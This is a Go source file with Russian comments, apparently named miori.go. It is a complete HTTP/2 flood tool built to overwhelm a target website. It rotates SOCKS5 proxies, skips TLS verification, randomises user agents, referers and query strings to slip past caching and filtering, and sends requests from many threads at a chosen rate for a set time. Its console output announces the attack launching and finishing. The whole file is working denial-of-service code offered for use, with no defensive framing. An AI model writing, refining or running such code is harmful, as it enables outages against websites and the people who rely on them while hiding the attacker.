package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/proxy"
)

// Константы для рандомизации
var (
	useragents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	}
	referers = []string{
		"https://www.google.com/",
		"https://yandex.ru/",
		"https://t.co/",
		"https://www.facebook.com/",
	}
)

// Вспомогательные функции
func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

// Основной воркер
func runWorker(target *url.URL, proxies []string, rate int, stopTime time.Time, extra, pathFlag, ref bool, wg *sync.WaitGroup) {
	defer wg.Done()

	for time.Now().Before(stopTime) {
		proxyAddr := proxies[rand.Intn(len(proxies))]
		
		// Настройка SOCKS5 прокси
		dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
		if err != nil {
			continue
		}

		// Установка TCP соединения
		conn, err := dialer.Dial("tcp", target.Host+":443")
		if err != nil {
			continue
		}

		// TLS Handshake (JA3 Bypass в Go делается через кастомные CipherSuites)
		tlsConn := tls.Client(conn, &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2"},
			ServerName:         target.Host,
			MinVersion:         tls.VersionTLS12,
		})

		if err := tlsConn.Handshake(); err != nil {
			conn.Close()
			continue
		}

		// Инициализация HTTP/2
		t2 := &http2.Transport{}
		h2Conn, err := t2.NewClientConn(tlsConn)
		if err != nil {
			tlsConn.Close()
			continue
		}

		// Цикл отправки запросов (Flood)
		for time.Now().Before(stopTime) {
			if !h2Conn.CanTakeNewRequest() {
				break
			}

			for i := 0; i < rate; i++ {
				finalPath := target.Path
				if finalPath == "" {
					finalPath = "/"
				}
				
				// Реализация --path
				if pathFlag {
					sep := "?"
					if strings.Contains(finalPath, "?") {
						sep = "&"
					}
					finalPath += sep + randomString(8) + "=" + strconv.Itoa(rand.Intn(999999))
				}

				req, _ := http2.NewRequest("GET", "https://"+target.Host+finalPath, nil)
				
				// Заголовки
				req.Header.Set("user-agent", useragents[rand.Intn(len(useragents))])
				if ref {
					req.Header.Set("referer", referers[rand.Intn(len(referers))])
				}
				if extra && rand.Float32() > 0.5 {
					req.Header.Set("dnt", "1")
					req.Header.Set("sec-fetch-user", "?1")
				}

				// Отправка (Fire and Forget)
				go func() {
					res, err := h2Conn.RoundTrip(req)
					if err == nil {
						res.Body.Close()
					}
				}()
			}
			// Пауза 1 секунда как в твоем setInterval
			time.Sleep(time.Second)
		}
		tlsConn.Close()
	}
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Использование: go run miori.go <target> <time> <rate> <threads> <proxyfile> [--path] [--extra] [--ref]")
		return
	}

	// Парсинг аргументов
	targetRaw := os.Args[1]
	if !strings.HasPrefix(targetRaw, "http") {
		targetRaw = "https://" + targetRaw
	}
	targetURL, _ := url.Parse(targetRaw)
	
	duration, _ := strconv.Atoi(os.Args[2])
	rate, _ := strconv.Atoi(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[4])
	proxyFile := os.Args[5]

	proxies, err := readLines(proxyFile)
	if err != nil {
		fmt.Printf("Ошибка чтения прокси: %v\n", err)
		return
	}

	// Проверка флагов
	cmdLine := strings.Join(os.Args, " ")
	extra := strings.Contains(cmdLine, "--extra")
	pathFlag := strings.Contains(cmdLine, "--path")
	ref := strings.Contains(cmdLine, "--ref")

	stopTime := time.Now().Add(time.Duration(duration) * time.Second)
	var wg sync.WaitGroup

	fmt.Printf("[⚡] АТАКА ЗАПУЩЕНА: %s\n", targetURL.Host)
	fmt.Printf("[⚙️] Конфиг: Threads: %d | Rate: %d | Time: %ds\n", threads, rate, duration)

	// Запуск потоков (воркеров)
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go runWorker(targetURL, proxies, rate, stopTime, extra, pathFlag, ref, &wg)
	}

	// Ожидание завершения времени
	wg.Wait()
	fmt.Println("[✅] Атака окончена.")
}
